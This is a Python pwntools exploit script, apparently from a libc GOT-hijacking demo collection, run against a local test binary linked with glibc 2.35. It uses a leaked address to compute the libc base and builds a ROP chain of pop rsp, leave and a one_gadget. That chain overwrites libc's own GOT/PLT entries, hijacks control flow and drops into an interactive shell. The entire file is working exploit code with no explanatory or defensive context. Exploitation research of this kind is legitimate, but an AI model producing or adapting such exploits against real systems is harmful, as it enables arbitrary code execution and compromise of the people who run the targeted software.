# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Libc-GOT-Hijacking\Pre\Demo\fx5\fx5.py
from pwn import *

context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]
context.arch = "amd64"
# context.log_level='debug'
libc = ELF("/glibc/x64/2.35/lib/libc.so.6")
p = process("../main", env={"LD_PRELOAD": "/glibc/x64/2.35/lib/libc.so.6"})
# gdb.attach(p,'''b *0x7ffff7c2c000''')
base = int(p.readline(), 16) - (0x7FF6A25244A0 - 0x7FF6A24C8000)
libc.address = base
dest = libc.dynamic_value_by_tag("DT_PLTGOT") + base
plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
pop_rsp = 0x00000000000C9FA6 + base
sh = libc.search(b"/bin/sh").__next__()
leave = 0x00000000000306DD + base
rax = 0x0000000000044A60 + base
one_gadget = 0xF7E22 + base
payload = flat(
    [dest + 0x18, pop_rsp, rax, one_gadget, leave, dest + 0x938, 0xDEADBEEF, plt0]
)
p.send(p64(dest + 0x8))
success(hex(len(payload)))
p.send(p64(len(payload)))
p.send(payload)
p.interactive()
